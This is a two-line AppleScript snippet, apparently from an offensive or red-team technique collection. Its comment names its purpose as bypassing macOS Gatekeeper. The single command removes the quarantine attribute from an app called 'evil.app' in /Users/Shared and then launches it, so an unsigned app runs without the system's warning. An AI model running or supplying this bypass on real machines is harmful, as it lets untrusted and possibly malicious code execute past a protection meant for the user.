--  Bypass Gatekeeper by Executing Unsigned App in Terminal
do shell script "xattr -d com.apple.quarantine /Users/Shared/evil.app && open /Users/Shared/evil.app"
